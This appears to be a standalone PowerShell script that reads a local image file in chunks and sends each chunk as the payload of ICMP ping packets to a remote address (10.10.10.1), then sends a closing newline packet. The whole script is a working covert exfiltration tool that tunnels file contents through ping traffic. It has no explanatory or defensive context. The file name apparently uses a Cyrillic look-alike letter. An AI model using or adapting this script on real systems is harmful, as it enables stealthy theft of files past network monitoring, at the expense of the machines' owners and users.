$remoteip = "10.10.10.1" 
$file = "C:\Users\user\сat.jpg"
$bufsize = 1400
$barr = New-Object byte[] $bufsize


$icmp_client = New-Object System.Net.NetworkInformation.Ping
$icmp_client_options = New-Object System.Net.NetworkInformation.PingOptions
$icmp_client_options.DontFragment = $true

$bts = [System.IO.File]::OpenRead($file)

while($rdd = $bts.Read($barr, 0, $bufsize)){
    if ($rdd -lt $bufsize){
        $barr = $barr[0..$rdd] 
        $bufsize = $rdd
    }
    $icmp_client.Send($remoteip, 10, $barr, $icmp_client_options)
    $icmp_client.PingCompleted
    start-sleep -Milliseconds 50 
}

$icmp_client.Send(
    $remoteip, 
    128, 
    [text.encoding]::UTF8.GetBytes("`n"), 
    $icmp_client_options)

$bts.Dispose()
